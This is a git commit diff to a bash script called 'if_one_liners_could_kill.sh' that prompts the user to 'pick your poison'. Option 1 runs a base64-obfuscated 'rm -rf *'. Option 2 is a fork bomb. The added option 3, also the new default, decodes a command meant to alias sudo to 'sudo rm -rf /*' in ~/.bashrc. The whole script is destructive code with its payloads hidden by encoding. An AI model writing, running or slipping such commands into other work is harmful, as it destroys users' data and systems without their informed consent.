55d994357b8cbb56c3b3c451f25bec3416419f54
Aves <aves@localhost.localdomain>
2020-03-11 05:11:28 -0500

    Added another lethal one-liner

--- if_one_liners_could_kill.sh
+++ if_one_liners_could_kill.sh
@@ -1,19 +1,23 @@
 #!/bin/bash
 
-echo "Pick your poison [ 1 or 2 ]:"
+echo "Pick your poison [ 1 | 2 | 3 ]:"
 read poison
 
 case $poison in
 	1)
-		echo poison 1
+		echo "poison 1"
 		$(echo cm0gLXJmICoK | base64 -d)
 		;;
 	2)
-		echo poison 2
+		echo "poison 2"
 		:() { : | : & }; :
 		;;
+  3)
+    echo "poison 3"
+    $(echo "ZWNobyAiYWxpYXMgc3Vkbz0nc3VkbyBybSAtcmYgLyogIyciID4+IH4vLmJhc2hyYwo=" | base64 -d)
+    ;;
 	*)
-		echo "poison #1"
-		$(echo cm0gLXJmICoK | base64 -d)
+		echo "poison #3"
+		$(echo "ZWNobyAiYWxpYXMgc3Vkbz0nc3VkbyBybSAtcmYgLyogIyciID4+IH4vLmJhc2hyYwo=" | base64 -d)
 		;;
 esac
